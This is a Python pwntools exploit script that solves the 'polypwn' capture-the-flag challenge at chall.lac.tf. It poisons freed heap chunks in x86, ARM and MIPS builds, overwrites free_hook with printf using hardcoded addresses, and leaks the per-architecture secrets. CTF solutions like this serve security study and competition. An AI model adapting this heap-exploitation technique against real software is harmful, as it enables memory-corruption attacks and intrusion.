#!/usr/bin/env python3

from pwn import *

exe = ELF("./polypwn")

context.binary = exe

serv = "chall.lac.tf"
port = 31167

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
            """)
    return r

r = conn()

def poly(idx):
    r.sendlineafter(b"choice:", b"1")
    r.sendlineafter(b"cast:", b"1")
    r.sendlineafter(b"daemon:", str(idx).encode())

def cast(data):
    r.sendlineafter(b"choice:", b"1")
    r.sendlineafter(b"cast:", b"2")
    r.sendlineafter(b"size:", b"4095")
    r.sendlineafter(b"data:", data)

def add(idx, size):
    cast(b"1")
    cast(str(idx).encode())
    cast(str(size).encode())

def free(idx):
    cast(b"3")
    cast(str(idx).encode())

def editone(idx, size, data, id):
    bad = [0, 1, 2]
    bad.remove(id)
    poly(bad[0])
    cast(b"2")
    poly(bad[1])
    if idx < 4:
        print("idx cannot overlap command")
        exit()
    cast(str(idx).encode())
    if size < 4:
        print("size cannot overlap command")
        exit()
    cast(str(size).encode())
    cast(data)
    poly(bad[0])
    cast(b"0")
    cast(b"69")
    cast(b"A")
    poly(-1)

def main():
    r.recvuntil(b"secret: ")
    x86_pswd = r.recvline().strip()
    r.recvuntil(b"secret: ")
    arm_pswd = r.recvline().strip()
    r.recvuntil(b"secret: ")
    mips_pswd = r.recvline().strip()

    # there is some racing that makes this fail occasionally

    X86 = 0
    ARM = 1
    MIPS = 2
    x86_freehook = 0x80e682c
    x86_printf = 0x80519b0
    arm_freehook = 0x8b3d0
    arm_printf = 0x17304
    mips_freehook = 0x1200a1228
    mips_printf = 0x12000bc80

    add(0, 0x69)
    base = 16
    add(base+0, 0x18)
    add(base+1, 0x18)
    free(base+0)
    free(base+1)
    editone(base+1, 4, p32(x86_freehook), X86)
    editone(base+1, 8, p64(arm_freehook), ARM)
    editone(base+1, 8, p64(mips_freehook, endian="big"), MIPS)
    add(base+0, 0x18)
    add(base+1, 0x18)
    editone(base+1, 4, p32(x86_printf), X86)
    editone(base+1, 8, p64(arm_printf), ARM)
    editone(base+1, 8, p64(mips_printf, endian="big"), MIPS)
    add(base+2, 0x18)
    editone(base+2, 0x18, x86_pswd, X86)
    editone(base+2, 0x18, arm_pswd, ARM)
    editone(base+2, 0x18, mips_pswd, MIPS)
    free(base+2)
    cast(b"A")
    r.sendlineafter(b"choice:", b"3")
    r.interactive()

if __name__ == "__main__":
    main()
